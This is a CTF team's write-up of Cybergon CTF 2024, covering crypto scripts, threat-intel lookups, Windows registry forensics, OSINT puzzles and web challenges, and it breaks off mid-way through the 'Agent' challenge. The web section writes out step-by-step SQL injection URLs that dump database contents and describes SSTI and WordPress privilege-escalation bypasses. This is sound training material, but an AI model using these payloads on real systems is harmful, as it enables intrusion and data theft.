---
title: Cybergon CTF 2024 Writeup
published: 2024-12-01
description: Writeups from CYBERGON CTF 2024 (30 Nov – 1 Dec 2024) — crypto, threat intel, digital forensics, misc, web, recon, OSINT and stegano, by Team pwn_|>.
tags: [ctf, crypto, forensics, osint, web, stegano, threat-intel]
category: CTF
draft: false
---

- **Event:** CYBERGON CTF 2024
- **Event dates:** 30 November – 1 December 2024
- **Team:** pwn_|>
- **Team members:** Kaung Yan Paing, Aung Soe Paing, Thant Thuya Oo

![Cybergon CTF 2024](/images/cybergon-2024/cybergon-2024-p01-16.png)

## CRYPTO

### Warm Up

![Warm Up](/images/cybergon-2024/cybergon-2024-p05-201.png)

I downloaded the given file and found binary code in the file, so I converted
it to a string:

![Binary decode](/images/cybergon-2024/cybergon-2024-p05-202.png)

After converting it, I found a hex value, then converted it to ASCII:

![Hex decode](/images/cybergon-2024/cybergon-2024-p06-209.png)

After converting to ASCII I found a strange string. I didn't know what it was,
but I thought it might be some kind of base encoding, so I tried many base
encodings and got the flag with **base92**:

![base92](/images/cybergon-2024/cybergon-2024-p06-210.png)

Flag: `CYBERGON_CTF2024{b45392_h3x_b1n4ry}`

### RSA1

![RSA1](/images/cybergon-2024/cybergon-2024-p07-212.png)

After checking the script, I understood `crypto.py`, then wrote a script to
decrypt the given output:

```python
from math import gcd
from sympy import mod_inverse
from Crypto.Util.number import long_to_bytes

# Given values from the output
n = 15750852827675876763873475442462133446639481525924397795921058023957766165771472272 \
     62253627742315439203769135796580524948266501642801518362897344525906471023133815841 \
     33512835595817708427222746495824286741840967127393187086028742577763080469063534742 \
     728547285121808241078515099307495843605080694383425986909029
cip1 = 69950256754119187070741220414057295159525964023691737870808579797990094306696842507 \
       54659185869103298138534805240624620353019232493586761630507063793684892687802266208 \
       24010909886313240249646307295107280439004545110125521058834132659193004346748235772 \
       32105833994040714469215427142851489025266027204415434792116
cip2 = 26975575766224799967239054937673125413993489249748738598424368718984020839138611191 \
       33315923153158285457188891137223079455912765872173881036406957905010208946587313421 \
       81966728466273526971875841371815031880035975602290784948809177053491406632282817054 \
       08967589237626894208542139123054938434957445017636202240137
exp1 = 0x10003  # 65539
exp2 = 0x10001  # 65537

# Extended Euclidean Algorithm to compute s1 and s2
def extended_gcd(a, b):
    if b == 0:
        return a, 1, 0
    gcd, x1, y1 = extended_gcd(b, a % b)
    x = y1
    y = x1 - (a // b) * y1
    return gcd, x, y

# Compute coefficients s1 and s2 for the linear combination
_, s1, s2 = extended_gcd(exp1, exp2)

# Adjust for negative coefficients
if s1 < 0:
    cip1 = mod_inverse(cip1, n)
    s1 = -s1
if s2 < 0:
    cip2 = mod_inverse(cip2, n)
    s2 = -s2

# Decrypt the FLAG
plaintext = (pow(cip1, s1, n) * pow(cip2, s2, n)) % n
FLAG = long_to_bytes(plaintext)

# Display or save the decrypted FLAG
try:
    print("Decrypted FLAG:", FLAG.decode())
except UnicodeDecodeError:
    print("Decrypted FLAG (raw bytes):", FLAG)
with open("decrypted_flag.bin", "wb") as f:
    f.write(FLAG)
```

Two ciphertexts of the same message under different exponents with the same
modulus — a classic common-modulus attack.

![Decrypted](/images/cybergon-2024/cybergon-2024-p09-215.png)

Flag: `CYBERGON_CTF2024{54m3_m0Du1u5!!!!!}`

### RSA2

![RSA2](/images/cybergon-2024/cybergon-2024-p10-217.png)

After checking the script, we explored algorithms and methods to find the `p`
value, and found we had to use an LCG and estimate the 2 coefficient values:

```python
from Crypto.Util.number import long_to_bytes, inverse
from sympy import gcd

# Given values (n, enc, secret_out) shortened here — see challenge output
n = 11222960521299588524750181772783274494136260187265706255449546453051590711140226315 \
     41848927360555078628686686121310756005906870539021116399652191688996284304946523272 \
     31135139371611397088295802558393024987455537428220282191208155227768171949322059656 \
     07268871964492604160910360630823557368267758149998874303490258640254944041292488072 \
     70982591223458905195623710186139325016638328822547124041054544128864142831772728248 \
     70896173982052160090665662919204841419709500439456927570536016814657719962226109835 \
     86467074641256505745938075296078516556647247578105282414665403694284697737212759109 \
     318373113013635864830591729084632299
enc = 45767340458154151173937147856315338933869894219753628730547147219737746356338072163 \
      51035380690773987036176885213178400507495200723424882273269742714702510936914814535 \
      12695376981583584559940852898944470908682075574524353840196888903668526351011685343 \
      17546929792821066229054051821760025911881891688485403177586726631106147465878472771 \
      86013825393236023619071578716175239047234708469908780821882885343491830991331125549 \
      71475444977148330100801192725461552758462144710882371319526518607768737940102374318 \
      60836651364888146378858529115847309135145131043111888257663104944369992957323929319 \
      81405989153709642320565431642748272
secret_out = [
    66953810142124815039330074236499310261872548478302540667230702366186795585053774076 \
    15255520734597057517814837583259516621523660469067610982873604847538679481612116144 \
    54069489049515000985218827598342456217176031173594216742343778579169394801974317367 \
    00748894114250914875188652571151182449577867725826435423376,
    80999476520674190840911057419847921359566717270329166665621275349092808316592952277 \
    88654917272826212484191188613998221508983010269137778752159901093624464399665676154 \
    42839357718391770795761744905254227473411763633365595175935905369350784190899934872 \
    86051416549535034924351610990671702249465937149523440124761,
    51216023802572567348628656925016052173207334859206588426719337944930296970754512831 \
    79209417555816902594551017773091666249583805170245424045958647335797050771189197817 \
    52812888985100221660902482488717800430464130033020511631285274081411073966601112079 \
    21123000905106255749641830317142711784497262578942366553634
]

# Parameters
modulus = 2**1024

# Reconstruct the LCG parameters `a` and `c` from the sequence
diff1 = (secret_out[1] - secret_out[0]) % modulus
diff2 = (secret_out[2] - secret_out[1]) % modulus

# Estimate coefficient 'a'
a = (diff2 * inverse(diff1, modulus)) % modulus

# Estimate coefficient 'c'
c = (secret_out[1] - a * secret_out[0]) % modulus

# Reverse engineer p from secret_out[0]
p = ((secret_out[0] - c) * inverse(a, modulus)) % modulus

# Validate if p is a valid factor of n
if n % p == 0:
    q = n // p
    print(f"p = {p}")
    print(f"q = {q}")

    # Compute the private key using the factorized p and q
    phi_n = (p - 1) * (q - 1)
    e = 65537
    d = inverse(e, phi_n)

    # Decrypt the message
    decrypted_message_int = pow(enc, d, n)
    decrypted_message = long_to_bytes(decrypted_message_int).decode(errors='ignore')
    print(f"Decrypted flag: {decrypted_message}")
else:
    print("The estimated p does not divide n correctly.")
```

![Recovered p](/images/cybergon-2024/cybergon-2024-p13-221.png)

Flag: `CYBERGON_CTF2024{C0nGr47uL4710N_y0u_g07_17!!!}`

### I LOVE POETRY

![I LOVE POETRY](/images/cybergon-2024/cybergon-2024-p13-222.png)

First I downloaded the given file and found a poem in the text file, with a
strange string at the end of the poem. I decoded it with base64 and found a
number string:

![Base64 decode](/images/cybergon-2024/cybergon-2024-p14-224.png)

![Numbers](/images/cybergon-2024/cybergon-2024-p14-225.png)

Then I rearranged the poem lines using those numbers and got the flag:

![Rearranged](/images/cybergon-2024/cybergon-2024-p15-227.png)

Flag: `CYBERGON_CTF2024{Haveyoueverheardthepoemcipher}`

### E45y p345y

![E45y p345y](/images/cybergon-2024/cybergon-2024-p15-228.png)

First I found a strange string in the challenge description. I didn't know what
it was, so I used a cipher identifier:

![Cipher identifier](/images/cybergon-2024/cybergon-2024-p16-230.png)

Then I tried all possible ciphers and got the flag with the **Rail Fence
Cipher**:

![Rail Fence](/images/cybergon-2024/cybergon-2024-p16-231.png)

Flag: `CYBERGON_CTF2024{R4!1_f3Nc3_C!pH3r_KrUb}`

### Warmup 1

![Warmup 1](/images/cybergon-2024/cybergon-2024-p17-238.png)

We were provided with a text file containing weird characters:

![Weird characters](/images/cybergon-2024/cybergon-2024-p17-239.png)

- The flag is separated into 2 parts.
- Using [dcode.fr/cipher-identifier](https://www.dcode.fr/cipher-identifier) to
  identify the cipher types, we came up with two: **Brainfuck** and
  **Whitespace**.
- We deciphered each part and combined them.

Flag: `CYBERGON_CTF2024{br41nfuck_0r_wh1t35p4c3?}`

### Warmup 2

![Warmup 2](/images/cybergon-2024/cybergon-2024-p18-241.png)

We got a secret message:

```text
2mx2jp3qf3im4oz3vq1cg1ck6r569r19x4ok5os4ok4wg6d04qc6gh5ul
```

Again I used a cipher identifier and concluded it was the **Twin Hex Cipher**:

![Twin Hex](/images/cybergon-2024/cybergon-2024-p18-243.png)

Flag: `CYBERGON_CTF2024{1t_15_4ll_4b0ut_tw1n}`

### Chill Bro

![Chill Bro](/images/cybergon-2024/cybergon-2024-p19-245.png)

In this challenge we were provided with a hint:

> "I always enjoy chilling by watching movies or series, and Arthur Conan Doyle
> is one of my favorites."

This led us to investigate Arthur Conan Doyle's works. We focused on the story
"The Adventure of the Dancing Men", which features a cipher that uses pictorial
representations of dancing stick figures to encode messages. We deduced that
the challenge involved solving a **Dancing Men Cipher**.

![Dancing Men](/images/cybergon-2024/cybergon-2024-p19-246.png)

Flag: `CYBERGON_CTF2024{TAKEABREAKBROLETSDANCE}`

## TI (Threat Intelligence)

### Stealer

![Stealer](/images/cybergon-2024/cybergon-2024-p20-250.png)

After a while of OSINT online, I came across this blog:
[From the Depths: Analyzing the Cthulhu Stealer Malware for macOS](https://www.cadosecurity.com/blog/from-the-depths-analyzing-the-cthulhu-stealer-malware-for-macos)

Following the flag format described in the challenge description
(`Abc script = abc`, `Def tool = def`): the script used by the stealer is
**Osascript**, the command-line tool for running AppleScript (T1059.002), and it
leverages the open-source tool **Chainbreaker** to dump keychain passwords.

Since the challenge author mentioned the flag contains MITREID, that means the
Technique ID, not the sub-technique ID (`.002`): the flag is `osa`, `T1059`,
`chainbreaker` separated by `_`.

Flag: `CYBERGON_CTF2024{osa_T1059_chainbreaker}`

### RDP

![RDP](/images/cybergon-2024/cybergon-2024-p21-255.png)

The information about the threat can be found here:
[Midnight Blizzard conducts large-scale spear-phishing campaign using RDP files](https://www.microsoft.com/en-us/security/blog/2024/10/29/midnight-blizzard-conducts-large-scale-spear-phishing-campaign-using-rdp-files/)

Flag: `CYBERGON_CTF2024{Backdoor:Script/HustleCon.A_15_5_APT29}`

### CRYPTO

![CRYPTO](/images/cybergon-2024/cybergon-2024-p22-259.png)

As per the information given by the author, we found an interesting blog here:
[BlueNoroff Hidden Risk: Threat Actor Targets MACs with Fake Crypto News and Novel Persistence](https://www.sentinelone.com/labs/bluenoroff-hidden-risk-threat-actor-targets-macs-with-fake-crypto-news-and-novel-persistence/)

Flag: `CYBERGON_CTF2024{BlueNoroff_5_sym.install_char__char_DoPost_Avantis Regtech Private Limited (2S8XHJ7948)}`

### Ransomware

![Ransomware](/images/cybergon-2024/cybergon-2024-p23-263.png)

The information about this type of campaign can be found at:
[Threat Assessment: BlackSuit Ransomware](https://unit42.paloaltonetworks.com/threat-assessment-blacksuit-ransomware-ignoble-scorpius/)

According to this blog, we can get the entire information to submit the flag.

Flag: `CYBERGON_CTF2024{Global\WLm87eV1oNRx6P3E4Cy9_OpenSSL AES_NanoDump}`

## Digital Forensics

### Warmup

![Digital Forensics Warmup](/images/cybergon-2024/cybergon-2024-p24-265.png)

- From the artifact file `.E01`, I opened it with Autopsy on Windows.
- One source of timezone investigation is the Windows Registry, so I exported
  the `SYSTEM` and `SOFTWARE` hives.
- Using RegistryExplorer from ZimmerTools assists in investigating the hives.
- Navigating to
  `SYSTEM\ControlSet001\Control\TimeZoneInformation\TimeZoneKeyName` gives the
  device's timezone:

![TimeZoneKeyName](/images/cybergon-2024/cybergon-2024-p25-267.png)

Flag: `CYBERGON_CTF2024{UTC+08:00 Kuala Lumpur, Singapore}`

### (1)

![Challenge 1](/images/cybergon-2024/cybergon-2024-p26-269.png)

From the `SYSTEM` hive, navigating to
`SYSTEM\ControlSet001\Control\ComputerName\ComputerName` gives the device name:
`WHITE-PARTY`.

![ComputerName](/images/cybergon-2024/cybergon-2024-p26-270.png)

To get the device owner's name, investigating the `SOFTWARE` hive at
`SOFTWARE\Microsoft\Windows NT` gives the `RegisteredOwner` value:
`Sean John Combs`.

![RegisteredOwner](/images/cybergon-2024/cybergon-2024-p27-272.png)

Flag: `CYBERGON_CTF2024{WHITE-PARTY, Sean John Combs}`

### (2)

![Challenge 2](/images/cybergon-2024/cybergon-2024-p28-274.png)

Looking at the browser artifacts, I came up with Firefox. I exported the
profiles and investigated to find a cookie value related to a Facebook account,
using DB Browser for SQLite:

![cookies.sqlite](/images/cybergon-2024/cybergon-2024-p28-275.png)

From `Profiles\5pegfp9o.default-release\cookies.sqlite`, in the Browse Data tab,
navigating to the `moz_cookie` table and filtering only facebook, we can quickly
identify the Facebook User ID: `61567849079733`. To get the status, visit
`www.facebook.com/61567849079733` (you have to log in):

![Facebook ID](/images/cybergon-2024/cybergon-2024-p29-278.png)

Flag: `CYBERGON_CTF2024{61567849079733,East Coast Rapper}`

### (3)

![Challenge 3](/images/cybergon-2024/cybergon-2024-p30-280.png)

Exporting the `SAM` hive, you can quickly identify the device owner's nickname
by looking at the Security Question:

![Security Question](/images/cybergon-2024/cybergon-2024-p30-281.png)

Flag: `CYBERGON_CTF2024{Ko Toke Gyi}`

### (4)

![Challenge 4](/images/cybergon-2024/cybergon-2024-p31-283.png)

From `C:\Users\Sean John Combs\AppData\Local\` we can get clues about installed
software. After some investigation, I came up with these browsers:

| No | Browser | Installed Date |
|----|-----------|-------------------|
| 1 | Brave | 2024-10-31 22:43:01 |
| 2 | Flock | 2024-11-03 06:25:52 |
| 3 | Chrome | 2024-10-29 00:58:22 |
| 4 | Maxthon | 2024-10-31 22:53:14 |
| 5 | Edge | 2024-10-28 23:50:10 |
| 6 | Firefox | 2024-10-31 03:44:39 |
| 7 | SeaMonkey | 2024-10-31 22:45:48 |
| 8 | Opera | 2024-10-31 04:02:37 |
| 9 | RockMelt | 2024-11-05 04:58:25 |
| 10 | UCBrowser | 2024-10-29 01:04:13 |
| 11 | Vivaldi | 2024-10-31 04:02:37 |

There are **11** browsers installed, and **RockMelt** is the last one installed
on the system.

Flag: `CYBERGON_CTF2024{11, RockMelt}`

### (5)

![Challenge 5](/images/cybergon-2024/cybergon-2024-p33-286.png)

From `NTUSER.DAT`, which contains user profile settings, we can check whether
the user set a default browser. Navigating to
`NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\` and
looking at the html keys, `.html` files run with Maxthon as the default browser.

Flag: `CYBERGON_CTF2024{Maxthon, 2024-10-31 16:23:14}`

### (7)

![Challenge 7](/images/cybergon-2024/cybergon-2024-p34-288.png)

After investigating a while, I considered the possibility that the device owner
set an alarm to remind himself of everyday exercise. Using Autopsy, I searched
for alarm-related files and came up with
`C:\Users\Sean John Combs\AppData\Local\Packages\Microsoft.WindowsAlarms_8wekyb3d8bbwe`.

To retrieve the alarm settings, navigate to the `Settings` folder, export the
`roaming.lock` and `settings.dat` files, copy them to our alarm settings, open
the Clocks program and click the alarm tab — you'll get the GYM TIME:

![Alarm settings](/images/cybergon-2024/cybergon-2024-p35-290.png)

The alarm time is in UTC; since the system is in AM/PM we convert it to 24-hour
time.

Flag: `CYBERGON_CTF2024{19:32}`

### (8)

![Challenge 8](/images/cybergon-2024/cybergon-2024-p36-292.png)

By looking at Sean John Combs' Facebook and performing some OSINT, I found his
birthday is on Nov 4. Checking his social media profile, he posted that on Nov
5, after his birthday, he checked in at Soi Cowboy.

![Check-in photo](/images/cybergon-2024/cybergon-2024-p37-294.png)

Flag: `CYBERGON_CTF2024{Khao San Road, Bangkok, Thailand}`

### (9)

![Challenge 9](/images/cybergon-2024/cybergon-2024-p38-296.png)

In the `SYSTEM` hive, navigating to
`SYSTEM\ControlSet001\Control\Power\User\PowerSchemes\381b4222-f694-41f0-9685-ff5bb260df2e\238c9fa8-0aad-41ed-83f4-97be242c8f20\29f6c1db-86da-48c5-9fdb-f2b67b1f44da`
gives the exact time in milliseconds — just convert it to minutes:

![Power scheme](/images/cybergon-2024/cybergon-2024-p38-297.png)

Flag: `CYBERGON_CTF2024{600, 30}`

### (11)

![Challenge 11](/images/cybergon-2024/cybergon-2024-p39-299.png)

From the following tab, we got the Facebook account of Lwan Eain Ko, who shared
posts related to Sean John Combs. Looking at the account, we came up with an
edit history:

![Edit history](/images/cybergon-2024/cybergon-2024-p39-300.png)

From there we can get the flag:

![Flag from history](/images/cybergon-2024/cybergon-2024-p40-302.png)

Flag: `CYBERGON_CTF2024{s0c14L_m3d14_O51n7!!!!!}`

### Badboy

![Badboy](/images/cybergon-2024/cybergon-2024-p41-304.png)

From the given file, after investigation we found that the system had been
compromised through a phishing attack. Looking at the email, there is a QR code
which is the method of delivering the malicious file to the system:

![QR email](/images/cybergon-2024/cybergon-2024-p42-306.png)

We also saw that `MovieTheratreUpdate.exe` had been detected by Windows Defender
as the malicious payload Meterpreter. From this we got the clue that the
attacker used phishing as the attack vector (T1566).

Next I copied the Edge profile from the evidence to my machine to check which
email account's owner had been tricked by this attack:

![Edge artifacts](/images/cybergon-2024/cybergon-2024-p42-307.png)

From the picture above, **Emily Stones** was the one who had been tricked by the
attacker.

Flag: `CYBERGON_CTF2024{Emily Stones_T1566}`

## MISC

### Sponsors

![Sponsors](/images/cybergon-2024/cybergon-2024-p43-309.png)

This hinted that the flag was hidden in sponsor-related material. By reviewing
the CTFtime description, we discovered a link to a Cybergon YouTube video
featuring the event sponsors, and found the flag from the video content:

![Sponsor video](/images/cybergon-2024/cybergon-2024-p43-310.png)

Flag: `CYBERGON_CTF2024{h3llfir3_p4cific_gm4_alt3r_creatig0n}`

### Zip Zap

![Zip Zap](/images/cybergon-2024/cybergon-2024-p44-312.png)

The "Zip Zap" challenge involved recursively extracting nested zip files, where
each zip contained another zip file, and the password for each file was embedded
in the filename of the next zip. Starting with `500.zip`, we noticed the
pattern: the filename of the nested zip provided the password.

![500.zip](/images/cybergon-2024/cybergon-2024-p44-313.png)

![499.zip](/images/cybergon-2024/cybergon-2024-p44-314.png)

To automate the extraction, we wrote a Python script using the `pyzipper`
module to handle the encryption and dynamically extract passwords from
filenames while extracting zips in sequence:

```python
import pyzipper
import os

def extract_nested_zip(starting_zip):
    current_zip = starting_zip
    while True:
        try:
            with pyzipper.AESZipFile(current_zip, 'r') as zip_ref:
                # Get the list of files in the current ZIP
                file_list = zip_ref.namelist()
                if len(file_list) != 1:
                    print(f"Unexpected contents in {current_zip}.")
                    break

                next_zip = file_list[0]
                password = next_zip.split(" - ")[-1].replace(".zip", "").strip()
                print(f"Extracting zip password:  '{password}'")

                zip_ref.setpassword(password.encode())
                zip_ref.extractall()

                current_zip = next_zip

        except pyzipper.BadZipFile:
            print(f"Invalid ZIP file: {current_zip}")
            break
        except RuntimeError as e:
            print(f"Failed to extract {current_zip}. Error: {e}")
            break
        except Exception as e:
            print(f"Unexpected error: {e}")
            break

        if not current_zip.endswith('.zip'):
            print(f"Extraction complete. Last file: {current_zip}")
            break

if __name__ == "__main__":
    starting_zip = input("Enter ZIP filename: ").strip()
    if os.path.exists(starting_zip):
        extract_nested_zip(starting_zip)
    else:
        print(f"File not found: {starting_zip}")
```

We found the reversed flag via the zip files' password values:

![Reversed flag](/images/cybergon-2024/cybergon-2024-p46-317.png)

Flag: `CYBERGON_CTF2024{y0U_g07_r341_F14g}`

### Your Favorite Song

![Your Favorite Song](/images/cybergon-2024/cybergon-2024-p47-319.png)

First I read the challenge description and downloaded the given file. I opened
the video file — the song is sung by Bruno and Rosé and the name of the song is
APT (Apartment). Then I used `exiftool` to check the video metadata and
extracted the zip file from the video using binwalk:

![exiftool](/images/cybergon-2024/cybergon-2024-p47-320.png)

![binwalk](/images/cybergon-2024/cybergon-2024-p48-322.png)

Flag: `CYBERGON_CTF2024{Y0u_g07_r053}`

### Triple Quiz

![Triple Quiz](/images/cybergon-2024/cybergon-2024-p48-323.png)

First I downloaded the given rar file. I needed a password to extract it, so I
brute-forced the rar password with John. After extracting, I got a wav file —
I noticed it was Morse code, so I decoded it on morsecode.world and got a
strange number:

![Morse decode 1](/images/cybergon-2024/cybergon-2024-p49-325.png)

![Morse decode 2](/images/cybergon-2024/cybergon-2024-p49-326.png)

Then I used a cipher identifier and identified it as the **Multi-tap Phone
(SMS) cipher**:

![Multi-tap 1](/images/cybergon-2024/cybergon-2024-p50-328.png)

![Multi-tap 2](/images/cybergon-2024/cybergon-2024-p50-329.png)

Flag: `CYBERGON_CTF2024{MORSEWITHTNINE}`

### Rules

![Rules](/images/cybergon-2024/cybergon-2024-p51-331.png)

I found the first part of the flag in the Discord channel:

![Discord](/images/cybergon-2024/cybergon-2024-p51-332.png)

I found the second part in the Cybergon CTFd rules:

![CTFd rules](/images/cybergon-2024/cybergon-2024-p52-334.png)

![Rules page](/images/cybergon-2024/cybergon-2024-p52-335.png)

I found the third part of the flag at
`https://cybergonmyanmar.com/blog/detail/14`:

![Blog](/images/cybergon-2024/cybergon-2024-p53-338.png)

Flag: `CYBERGON_CTF2024{d1sc0rd_p0rt4l_w3b}`

### Favourite Menu & Restaurant

![Favourite Menu & Restaurant](/images/cybergon-2024/cybergon-2024-p53-339.png)

By performing OSINT, we came up with an interesting link on social media:

![Social link](/images/cybergon-2024/cybergon-2024-p54-341.png)

On the Google Calendar, we found interesting hex strings:

![Calendar hex](/images/cybergon-2024/cybergon-2024-p54-342.png)

Using CyberChef to decode them, I got a link:

![CyberChef](/images/cybergon-2024/cybergon-2024-p55-344.png)

This link redirects to Google Drive, which contains a compressed file:

![Drive](/images/cybergon-2024/cybergon-2024-p55-345.png)

After downloading and decompressing, we got two files: a jpeg and a zip.
According to the clue in the challenge description, the password of the zip is
formatted as `City_Country` based on the given picture — `boat.jpg`:

![boat.jpg](/images/cybergon-2024/cybergon-2024-p56-348.png)

Looking at the boat picture, it seems to be in France. Let's do a reverse image
search:

![Reverse image](/images/cybergon-2024/cybergon-2024-p56-349.png)

After navigating the reverse image results, I found this helpful page:
[stolenboats.info/en/theft/2856](https://stolenboats.info/en/theft/2856) — so
the password is `La Rochelle_France`.

We got a `Ghost Sound.wav`, which can be converted to a spectrogram:

![Spectrogram](/images/cybergon-2024/cybergon-2024-p57-351.png)

Using these words on what3words:

![what3words](/images/cybergon-2024/cybergon-2024-p57-352.png)

Flag: `CYBERGON_CTF2024{Beef Soup_Heng Chun Seng}`

## Web

### Tricky Number

![Tricky Number](/images/cybergon-2024/cybergon-2024-p58-354.png)

First I downloaded `server.js` and read it to understand the code. Then I used
ChatGPT to get the number:

![server.js analysis](/images/cybergon-2024/cybergon-2024-p58-355.png)

![Result](/images/cybergon-2024/cybergon-2024-p59-357.png)

Flag: `CYBERGON_CTF2024{oH_n0t_Th4t_tRiCk3rY}`

### Greeting

![Greeting](/images/cybergon-2024/cybergon-2024-p59-358.png)

When I opened the given URL in the browser, I found an input box. I tried to
understand how the challenge works, then started testing possible
vulnerabilities:

![Input box](/images/cybergon-2024/cybergon-2024-p59-359.png)

I found SSTI in the challenge, then tried to get RCE using SSTI:

![SSTI detected](/images/cybergon-2024/cybergon-2024-p60-361.png)

![RCE test](/images/cybergon-2024/cybergon-2024-p60-362.png)

After testing many times, I understood the challenge filters parentheses, so I
used Unicode characters to bypass them:

![Parentheses filter](/images/cybergon-2024/cybergon-2024-p60-363.png)

Let's try RCE with the bypass-encoded payload:

![Bypass payload](/images/cybergon-2024/cybergon-2024-p61-365.png)

![Payload sent](/images/cybergon-2024/cybergon-2024-p61-366.png)

Bingo!!! The filter is bypassed, then I read `flag.txt`:

![Flag read](/images/cybergon-2024/cybergon-2024-p61-367.png)

![Flag](/images/cybergon-2024/cybergon-2024-p62-371.png)

Flag: `CYBERGON_CTF2024{H3lL0_fRoM_CyBer_GoN_2024}`

### Hidden One

![Hidden One](/images/cybergon-2024/cybergon-2024-p62-372.png)

In this challenge we were tasked with discovering a hidden flag without a
direct target URL provided. Initially we explored the CybergonCTF URL, checking
common endpoints like `/robots.txt`, which did not yield useful information.
Testing the `/flag` endpoint returned a 404 error, but accessing `/flag.txt` led
to a seemingly blank page. By inspecting the page's source code using browser
Developer Tools, we found the flag in a hidden span element styled with
`color: transparent`.

![Hidden span](/images/cybergon-2024/cybergon-2024-p63-374.png)

Flag: `CYBERGON_CTF2024{n0w_y0u_f0und_m3}`

### Event

![Event](/images/cybergon-2024/cybergon-2024-p63-375.png)

When I opened the given URL in the browser, I found two input boxes. I filled
in the input fields and submitted a request to search for event data. I
suspected the data was being requested from an SQL database, so I attempted to
detect SQL injection vulnerabilities in the parameters:

![Search form](/images/cybergon-2024/cybergon-2024-p64-377.png)

```text
http://46.250.232.141:5555/search.php?query=1&date=11/30'/2024-12/1/2024
```

![SQL error](/images/cybergon-2024/cybergon-2024-p64-378.png)

We tried to fix the SQL error using `#`, but it didn't work on the query, so we
attempted to bypass it using URL encoding: `#` = `%23`.

```text
http://46.250.232.141:5555/search.php?query=1&date=11/30'%23/2024-12/1/2024
```

![Bypassed](/images/cybergon-2024/cybergon-2024-p64-379.png)

Let's count the columns using `order by`. This time the URL-encoded space `%20`
did not work, so we used the horizontal tab's URL-encoded value `%09`:

```text
http://46.250.232.141:5555/search.php?query=1&date=11/30'order%09by%0910%23/2024-12/1/2024
```

![order by 10](/images/cybergon-2024/cybergon-2024-p64-380.png)

```text
http://46.250.232.141:5555/search.php?query=1&date=11/30'order%09by%095%23/2024-12/1/2024
```

![order by 5](/images/cybergon-2024/cybergon-2024-p65-382.png)

We found a total of **5 columns**:

```text
http://46.250.232.141:5555/search.php?query=1&date=11/30'%09union%09select%091,2,3,4,5%23/2024-12/1/2024
```

![union select](/images/cybergon-2024/cybergon-2024-p65-383.png)

Database dump:

```text
http://46.250.232.141:5555/search.php?query=1&date=11/30'%09union%09select%091,database(),3,4,5%23/2024-12/1/2024
```

![database()](/images/cybergon-2024/cybergon-2024-p65-384.png)

Tables dump:

```text
http://46.250.232.141:5555/search.php?query=1&date=11/30'%09union%09select%091,(SELECT%09GROUP_CONCAT(table_name%09SEPARATOR%090x3a3a)%09FROM%09INFORMATION_SCHEMA.TABLES%09WHERE%09TABLE_SCHEMA=DATABASE()),3,4,5%23/2024-12/1/2024
```

![Tables](/images/cybergon-2024/cybergon-2024-p66-386.png)

Columns dump:

```text
http://46.250.232.141:5555/search.php?query=1&date=11/30'%09union%09select%091,(SELECT%09GROUP_CONCAT(column_name%09SEPARATOR%090x3a3a)%09FROM%09INFORMATION_SCHEMA.COLUMNS%09WHERE%09TABLE_NAME=0x6379626572676f6e),3,4,5%23/2024-12/1/2024
```

![Columns](/images/cybergon-2024/cybergon-2024-p66-387.png)

Data dump:

```text
http://46.250.232.141:5555/search.php?query=1&date=11/30'%09union%09select%091,(SELECT%09GROUP_CONCAT(id,title%09SEPARATOR%090x3a3a)%09FROM%09events_db.cybergon),3,4,5%23/2024-12/1/2024
```

![Data](/images/cybergon-2024/cybergon-2024-p67-389.png)

Bingo!!! Finally, we found the flag value in the title column.

Flag: `CYBERGON_CTF2024{SqL_1s_FuN_4nd_E@Sy}`

### Cybergon Blog

![Cybergon Blog](/images/cybergon-2024/cybergon-2024-p67-390.png)

When I opened the given URL in the browser, I found the Flag Page, Sample Page
and User Registration Page. I went to the Flag Page but did not find any flag
data, so I created an account via the User Registration page:

![Registration](/images/cybergon-2024/cybergon-2024-p67-391.png)

Logged in with the registered account:

![Login](/images/cybergon-2024/cybergon-2024-p68-393.png)

![Subscriber role](/images/cybergon-2024/cybergon-2024-p68-394.png)

Now my account's user role is subscriber level. Then I found the role privilege
escalation function in the `user-profile-enhancer.php` plugin source code file:

![Plugin source](/images/cybergon-2024/cybergon-2024-p68-395.png)

The plugin contains a role privilege escalation vulnerability in the
`custom_profile_update_hook` function, which allows any user to escalate their
role by submitting a crafted form. The function checks for a `custom_option`
field in the profile update form, and if the field contains the value `0`, the
user's role is set to contributor without proper validation or authorization
checks. Let's manipulate!

![Vulnerable function](/images/cybergon-2024/cybergon-2024-p69-398.png)

By intercepting the request with Burp Suite during a profile update, the
`custom_field` parameter was manipulated to `custom_option[]` with a value of
`0`. Upon submitting the modified request, the vulnerable
`custom_profile_update_hook` function was triggered and the user's role was
elevated to contributor:

![Burp manipulation](/images/cybergon-2024/cybergon-2024-p69-399.png)

This allowed access to the flag page `http://46.250.232.141:8081/?page_id=5`:

![Flag page](/images/cybergon-2024/cybergon-2024-p70-401.png)

Flag: `CYBERGON_CTF2024{w0rdpr3ss_vUIN_1s_FuN_4nd_3asy}`

### Cybergon Blog 2

![Cybergon Blog 2](/images/cybergon-2024/cybergon-2024-p70-402.png)

When I opened the challenge URL in the browser, I found the Sample Page and
User Registration Page. Hint: they also have confidential pages. We did not find
any flag data, so I created an account via the User Registration page:

![Registration](/images/cybergon-2024/cybergon-2024-p70-403.png)

Let's analyze the source code. Cybergon Blog2 was running a plugin
(`user-post-enhancer.php`) that lacked proper authorization checks in its AJAX
actions. First we identified the `generate_nonce()` function as vulnerable,
since it allowed any logged-in user to generate a nonce without verifying their
roles:

![generate_nonce vuln](/images/cybergon-2024/cybergon-2024-p71-405.png)

We planned the nonce code generation process using a Python script. Using valid
cookies, we sent a POST request to the `generate_nonce` AJAX action:

![Nonce request](/images/cybergon-2024/cybergon-2024-p71-406.png)

Let's run the script:

![Script output](/images/cybergon-2024/cybergon-2024-p71-407.png)

We obtained a valid nonce: `1774488b72`.

Next we targeted the `read_post_data()` function, which accepted the generated
nonce and allowed any user to retrieve the content of a post without verifying
user permissions:

![read_post_data](/images/cybergon-2024/cybergon-2024-p72-409.png)

We sent a POST request to the confidential pages using the generated nonce:

![Python script](/images/cybergon-2024/cybergon-2024-p72-410.png)

A POST request to the `read_post_data()` action successfully retrieved post
data containing the flag:

![Flag retrieved](/images/cybergon-2024/cybergon-2024-p72-411.png)

Flag: `CYBERGON_CTF2024{W0rdPr3ss_1s_FuN_W4s_1t?}`

### Agent

![Agent](/images/cybergon-2024/cybergon-2024-p73-413.png)

When I opened the challenge URL in the browser, I found the user account
registration and login page. I created an account and logged in:

![Register](/images/cybergon-2024/cybergon-2024-p73-414.png)

After logging in, the page shows: "Login successful. View your logs." The link
provides access to the login logs:

